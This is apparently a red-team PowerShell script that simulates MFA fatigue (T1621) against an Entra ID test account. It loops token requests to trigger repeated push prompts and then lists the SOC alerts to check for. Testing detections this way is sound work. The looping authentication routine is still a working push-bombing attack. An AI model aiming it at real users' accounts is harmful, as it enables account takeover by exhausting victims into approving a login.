<#
.SYNOPSIS
    T1621 - MFA Fatigue Simulation - Red Team TTP Demo
.DESCRIPTION
    Triggers repeated MFA authentication requests against a test account
    to generate SOC alerts for excessive MFA prompts.
    For authorized red team use only against accounts you control.
#>

# ─────────────────────────────────────────────
# STEP 1: Auto-install prerequisites
# ─────────────────────────────────────────────
Write-Host "`n[*] Checking prerequisites..." -ForegroundColor Cyan

if (-not (Get-Module -ListAvailable -Name MSAL.PS)) {
    Write-Host "[*] Installing MSAL.PS module..." -ForegroundColor Yellow
    Install-Module -Name MSAL.PS -Force -Scope CurrentUser
    Write-Host "[+] MSAL.PS installed." -ForegroundColor Green
} else {
    Write-Host "[+] MSAL.PS already installed." -ForegroundColor Green
}

Import-Module MSAL.PS -ErrorAction Stop
Write-Host "[+] MSAL.PS loaded.`n" -ForegroundColor Green

# ─────────────────────────────────────────────
# STEP 2: Interactive prompts
# ─────────────────────────────────────────────
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "   T1621 - MFA Fatigue Simulation Setup    " -ForegroundColor Cyan
Write-Host "============================================`n" -ForegroundColor Cyan

$TenantId  = Read-Host "Enter your Tenant ID or domain (e.g. company.onmicrosoft.com)"
$TestUser  = Read-Host "Enter the test account UPN (e.g. testuser@company.com)"
$Password  = Read-Host "Enter the test account password"

$AttemptCount = Read-Host "How many MFA prompts to trigger? (3-5 recommended)"
if (-not ($AttemptCount -match '^\d+$') -or [int]$AttemptCount -lt 1) {
    Write-Host "[!] Invalid number. Defaulting to 3." -ForegroundColor Yellow
    $AttemptCount = 3
}
$AttemptCount = [int]$AttemptCount

# ─────────────────────────────────────────────
# STEP 3: Confirm before running
# ─────────────────────────────────────────────
Write-Host "`n[*] About to simulate MFA fatigue:" -ForegroundColor Cyan
Write-Host "    Tenant   : $TenantId"
Write-Host "    Test User: $TestUser"
Write-Host "    Attempts : $AttemptCount"

$confirm = Read-Host "`nProceed? (yes/no)"
if ($confirm -ne "yes") {
    Write-Host "[!] Aborted by user." -ForegroundColor Yellow
    exit
}

# ─────────────────────────────────────────────
# STEP 4: Trigger repeated MFA requests
# ─────────────────────────────────────────────
Write-Host "`n[*] Starting MFA fatigue simulation...`n" -ForegroundColor Cyan

$Results = @()

for ($i = 1; $i -le $AttemptCount; $i++) {
    Write-Host "[*] MFA Attempt $i of $AttemptCount for: $TestUser" -ForegroundColor Yellow

    try {
        $SecurePass = ConvertTo-SecureString $Password -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential($TestUser, $SecurePass)

        # Attempt interactive auth - this triggers an MFA push to the account
        $Token = Get-MsalToken `
            -ClientId "1b730954-1685-4b74-9bfd-dac224a7b894" `
            -TenantId $TenantId `
            -UserCredential $Credential `
            -ErrorAction Stop

        Write-Host "[+] Attempt $i : MFA prompt triggered (or auth succeeded)" -ForegroundColor Green
        $Results += [PSCustomObject]@{ Attempt=$i; Result="PROMPTED/SUCCESS" }
    }
    catch {
        Write-Host "[-] Attempt $i : Request sent - MFA likely prompted or rejected" -ForegroundColor Red
        $Results += [PSCustomObject]@{ Attempt=$i; Result="SENT/REJECTED"; Error=$_.Exception.Message }
    }

    if ($i -lt $AttemptCount) {
        Write-Host "[*] Waiting 10 seconds before next attempt...`n"
        Start-Sleep -Seconds 10
    }
}

# ─────────────────────────────────────────────
# STEP 5: Results summary
# ─────────────────────────────────────────────
Write-Host "`n============================================" -ForegroundColor Cyan
Write-Host "   Results Summary" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
$Results | Format-Table Attempt, Result -AutoSize

Write-Host "[*] TTP T1621 complete." -ForegroundColor Cyan
Write-Host "[*] Check Entra ID Sign-In logs and Identity Protection for:" -ForegroundColor Cyan
Write-Host "     - Excessive MFA requests alert" -ForegroundColor White
Write-Host "     - MFA fatigue risk detection" -ForegroundColor White
Write-Host "     - Suspicious authentication pattern`n" -ForegroundColor White